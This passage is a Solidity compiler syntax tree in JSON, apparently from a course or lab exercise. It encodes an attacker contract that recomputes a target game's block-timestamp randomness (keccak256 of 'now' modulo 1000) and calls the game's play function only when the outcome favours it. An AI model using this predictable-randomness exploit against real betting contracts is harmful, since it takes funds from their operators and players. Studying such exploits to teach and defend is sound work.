												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 89,
												"src": "785:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_address",
													"typeString": "address"
												}
											],
											"id": 91,
											"name": "class44_game",
											"nodeType": "Identifier",
											"overloadedDeclarations": [],
											"referencedDeclaration": 86,
											"src": "772:12:0",
											"typeDescriptions": {
												"typeIdentifier": "t_type$_t_contract$_class44_game_$86_$",
												"typeString": "type(contract class44_game)"
											}
										},
										"id": 93,
										"isConstant": false,
										"isLValue": false,
										"isPure": false,
										"kind": "typeConversion",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "772:18:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_class44_game_$86",
											"typeString": "contract class44_game"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 114,
										"nodeType": "Block",
										"src": "844:102:0",
										"statements": [
											{
												"assignments": [
													100
												],
												"declarations": [
													{
														"constant": false,
														"id": 100,
														"name": "ramdom",
														"nodeType": "VariableDeclaration",
														"scope": 115,
														"src": "854:14:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														},
														"typeName": {
															"id": 99,
															"name": "bytes32",
															"nodeType": "ElementaryTypeName",
															"src": "854:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 107,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 104,
																	"name": "now",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 164,
																	"src": "898:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 102,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 149,
																	"src": "881:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 103,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodePacked",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "881:16:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function () pure returns (bytes memory)"
																}
															},
															"id": 105,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "881:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 101,
														"name": "keccak256",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 156,
														"src": "871:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_sha3_pure$__$returns$_t_bytes32_$",
															"typeString": "function () pure returns (bytes32)"
														}
													},
													"id": 106,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "871:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "854:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 112,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 109,
																"name": "ramdom",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 100,
																"src": "925:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes32",
																	"typeString": "bytes32"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes32",
																	"typeString": "bytes32"
																}
															],
															"id": 108,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "920:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_uint256_$",
																"typeString": "type(uint256)"
															},
															"typeName": "uint"
														},
														"id": 110,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "920:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31303030",
														"id": 111,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "935:4:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1000_by_1",
															"typeString": "int_const 1000"
														},
														"value": "1000"
													},
													"src": "920:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 98,
												"id": 113,
												"nodeType": "Return",
												"src": "913:26:0"
											}
										]
									},
									"documentation": null,
									"id": 115,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": true,
									"modifiers": [],
									"name": "get_random",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 95,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "816:2:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 98,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 97,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 115,
												"src": "839:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 96,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "839:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "838:6:0"
									},
									"scope": 147,
									"src": "797:149:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 130,
										"nodeType": "Block",
										"src": "985:81:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 122,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 119,
																	"name": "get_random",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 115,
																	"src": "1003:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_view$__$returns$_t_uint256_$",
																		"typeString": "function () view returns (uint256)"
																	}
																},
																"id": 120,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1003:12:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "353030",
																"id": 121,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1017:3:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_500_by_1",
																	"typeString": "int_const 500"
																},
																"value": "500"
															},
															"src": "1003:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 118,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															165,
															166
														],
														"referencedDeclaration": 165,
														"src": "995:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 123,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "995:26:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 124,
												"nodeType": "ExpressionStatement",
												"src": "995:26:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"expression": {
															"argumentTypes": null,
															"id": 125,
															"name": "gamecontract",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 94,
															"src": "1031:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_class44_game_$86",
																"typeString": "contract class44_game"
															}
														},
														"id": 127,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "play",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 63,
														"src": "1031:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_payable$__$returns$__$",
															"typeString": "function () payable external"
														}
													},
													"id": 128,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1031:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 129,
												"nodeType": "ExpressionStatement",
												"src": "1031:19:0"
											}
										]
									},
									"documentation": null,
									"id": 131,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 116,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "967:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 117,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "985:0:0"
									},
									"scope": 147,
									"src": "952:114:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 134,
										"nodeType": "Block",
										"src": "1098:16:0",
										"statements": []
									},
									"documentation": null,
									"id": 135,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 132,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1081:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 133,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1098:0:0"
									},
									"scope": 147,
									"src": "1072:42:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 145,
										"nodeType": "Block",
										"src": "1153:46:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 142,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 139,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 162,
																	"src": "1171:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 140,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "value",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1171:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 141,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1184:7:0",
																"subdenomination": "ether",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1000000000000000000_by_1",
																	"typeString": "int_const 1000000000000000000"
																},
																"value": "1"
															},
															"src": "1171:20:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 138,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															165,
															166
														],
														"referencedDeclaration": 165,
														"src": "1163:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 143,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1163:29:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 144,
												"nodeType": "ExpressionStatement",
												"src": "1163:29:0"
											}
										]
									},
									"documentation": null,
									"id": 146,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 136,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1136:2:0"
									},
									"payable": true,
									"returnParameters": {
										"id": 137,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1153:0:0"
									},
									"scope": 147,
									"src": "1124:75:0",
									"stateMutability": "payable",
									"superFunction": null,
									"visibility": "public"
								}
							],
							"scope": 148,
							"src": "643:558:0"
						}
					],
					"src": "0:1201:0"
				},
				"id": 0
			}
		}
	}
}